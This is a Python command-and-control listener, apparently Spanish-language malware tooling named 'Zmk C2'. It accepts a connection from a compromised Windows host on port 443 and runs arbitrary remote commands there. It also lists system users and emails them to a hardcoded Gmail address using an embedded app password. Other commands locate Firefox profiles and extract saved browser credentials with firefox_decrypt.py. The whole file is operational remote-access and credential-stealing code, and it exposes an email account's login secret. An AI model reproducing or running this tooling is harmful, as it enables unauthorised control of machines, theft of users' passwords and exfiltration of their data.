#!/bin/env python3
import subprocess
import smtplib
import signal
import sys
import socket
import os
import time
import tempfile
from email.mime.text import MIMEText

def def_handler(sig, frame):
    print(f"\nSALIENDO!!!\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:
    def __init__(self, ip, port):
        self.options = {
            "help": "Mostrar panel de ayuda",
            "get users": "Listar usuarios del sistema y enviarlos por correo electrónico",
            "get firefox_profiles": "Listar directorios de perfiles de Firefox",
            "get firefox_credentials": "Extraer credenciales de Firefox (requiere 'firefox_decrypt.py' en el cliente)"
        }
        self.ip = ip
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = None

        self.start_listener()

    def start_listener(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.ip, self.port))
            self.server_socket.listen(1)
            print(f"\n[+] Zmk SERVER escuchando en {self.ip}:{self.port}...\n")

            self.client_socket, self.client_address = self.server_socket.accept()
            print(f"[+] Conexión establecida desde: {self.client_address[0]}:{self.client_address[1]}\n")

        except socket.error as e:
            print(f"[!] Error al iniciar el listener: {e}")
            sys.exit(1)
        except Exception as e:
            print(f"[!] Ocurrió un error inesperado al iniciar el listener: {e}")
            sys.exit(1)

    def reliable_send(self, data):
        try:
            self.client_socket.send(str(len(data)).encode().ljust(16))
            self.client_socket.send(data)
        except socket.error:
            print(f"[!] Error al enviar datos. El cliente podría haberse desconectado.")
            return False
        return True

    def reliable_recv(self):
        try:
            raw_length = self.client_socket.recv(16).decode().strip()
            length = int(raw_length)

            data = b''
            while len(data) < length:
                packet = self.client_socket.recv(4096)
                if not packet:
                    break
                data += packet
            return data.decode(errors='ignore')

        except (socket.error, ValueError, IndexError) as e:
            print(f"[!] Error al recibir datos. El cliente podría haberse desconectado o los datos son inválidos: {e}")
            return None

    def execute_remote(self, command):
        if not self.reliable_send(command.encode()):
            return "[!] No se pudo enviar el comando. Cliente desconectado."

        result = self.reliable_recv()
        if result is None:
            return "[!] No se pudo recibir la salida del comando. Cliente desconectado."
        return result

    def get_users(self):
        print("[+] Obteniendo usuarios del sistema...")
        output_command = self.execute_remote("net user")
        if "[!]" in output_command:
            print(output_command)
            return

        print("[+] Enviando resultado por correo electrónico...")
        try:
            self.send_email(
                subject="[Zmk C2] Usuarios del Sistema",
                body=output_command,
                sender="zmksec23@gmail.com",
                recipients=["zmksec23@gmail.com"],
                password="vydw hnoh fgeg ulma"
            )
        except Exception as e:
            print(f"[!] Error al enviar el correo: {e}")

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
                smtp_server.login(sender, password)
                smtp_server.sendmail(sender, recipients, msg.as_string())
            print(f"[+] ¡Email enviado exitosamente!")
        except smtplib.SMTPAuthenticationError:
            print(f"[!] Error de autenticación SMTP. Revisa la contraseña de aplicación o permisos de Gmail.")
        except Exception as e:
            print(f"[!] Error al enviar el correo electrónico: {e}")

    def show_panel_help(self):
        print("\n--- Panel de Ayuda Zmk C2 ---")
        for key, value in self.options.items():
            print(f"  {key:<25} -> {value}")
        print("----------------------------\n")

    def get_firefox_profiles(self):
        print("[+] Obteniendo perfiles de Firefox...")
        whoami_output = self.execute_remote("whoami")
        if "[!]" in whoami_output:
            print(whoami_output)
            return

        try:
            username = whoami_output.split("\\")[-1].strip()
            path_command = f"dir C:\\Users\\{username}\\Appdata\\Roaming\\Mozilla\\Firefox\\Profiles\\"
            
            output_profiles = self.execute_remote(path_command)
            if "[!]" in output_profiles:
                print(output_profiles)
                return
            
            print(f"\n[+] Directorios de Perfiles de Firefox para {username}:\n")
            print(output_profiles)
            print("\n[!] Copia el nombre del directorio que contiene 'release' y úsalo con 'get firefox_credentials'.")
        except IndexError:
            print("[!] No se pudo parsear el nombre de usuario de la salida de 'whoami'.")
        except Exception as e:
            print(f"[!] Error inesperado en get_firefox_profiles: {e}")

    def get_firefox_credentials(self):
        profile_dir = input(f"[?] Inserta el nombre del directorio de perfil de Firefox (ej. 'abcd123.default-release'): ")
        if not profile_dir:
            print("[!] Directorio de perfil no especificado. Cancelando.")
            return

        print(f"[+] Intentando extraer credenciales de Firefox desde '{profile_dir}'...")
        whoami_output = self.execute_remote("whoami")
        if "[!]" in whoami_output:
            print(whoami_output)
            return

        try:
            username = whoami_output.split("\\")[-1].strip()
            command_decrypt = f"python firefox_decrypt.py C:\\Users\\{username}\\Appdata\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile_dir}"
            
            output_credentials = self.execute_remote(command_decrypt)
            if "[!]" in output_credentials:
                print(output_credentials)
                return
            
            print(f"\n[+] Credenciales de Firefox para '{profile_dir}':\n")
            print(output_credentials)
            print("\n[!] Recuerda que 'firefox_decrypt.py' debe estar en la máquina del cliente para que funcione.")
        except IndexError:
            print("[!] No se pudo parsear el nombre de usuario.")
        except Exception as e:
            print(f"[!] Error inesperado en get_firefox_credentials: {e}")

    def run(self):
        while True:
            try:
                command = input(f"{self.client_address[0]}> ")
                if not command:
                    continue

                if command == "exit":
                    self.reliable_send(command.encode())
                    self.client_socket.close()
                    self.server_socket.close()
                    print("[+] Conexión cerrada.")
                    break

                elif command == "get users":
                    self.get_users()
                elif command == "help":
                    self.show_panel_help()
                elif command == "get firefox_profiles":
                    self.get_firefox_profiles()
                elif command == "get firefox_credentials":
                    self.get_firefox_credentials()
                else:
                    command_output = self.execute_remote(command)
                    if command_output is not None:
                        print(command_output)

            except KeyboardInterrupt:
                print("\n[!] Ctrl+C detectado. Cerrando la conexión.")
                try:
                    self.reliable_send(b"exit")
                    self.client_socket.close()
                    self.server_socket.close()
                except socket.error:
                    pass
                sys.exit(0)
            except socket.error:
                print(f"[!] Cliente {self.client_address[0]} desconectado.")
                break
            except Exception as e:
                print(f"[!] Ocurrió un error en el bucle principal: {e}")

if __name__ == '__main__':
    listener = Listener("0.0.0.0", 443)
    listener.run()